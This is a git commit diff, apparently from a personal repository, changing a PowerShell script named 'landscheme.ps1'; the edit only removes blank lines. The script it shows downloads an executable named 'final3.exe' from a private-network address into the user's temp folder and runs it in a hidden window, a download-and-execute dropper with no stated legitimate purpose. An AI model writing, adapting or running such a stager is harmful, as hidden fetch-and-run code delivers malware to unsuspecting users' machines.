6adf45cfda4cd4f4cc82a3aa5d5b55f22ed44122
butterscotch6969 <butterscotch999@proton.me>
2025-10-30 03:24:20 -0700

    Update landscheme.ps1

--- landscheme.ps1
+++ landscheme.ps1
@@ -1,9 +1,7 @@
 # Define URL and destination
 $url = "http://192.168.126.128:2025/final3.exe"
 $destination = Join-Path $env:TEMP "final3.exe"
-
 # Download file
 Invoke-WebRequest -Uri $url -OutFile $destination
-
 # Execute the downloaded file
 Start-Process -WindowStyle Hidden -FilePath $destination -Wait
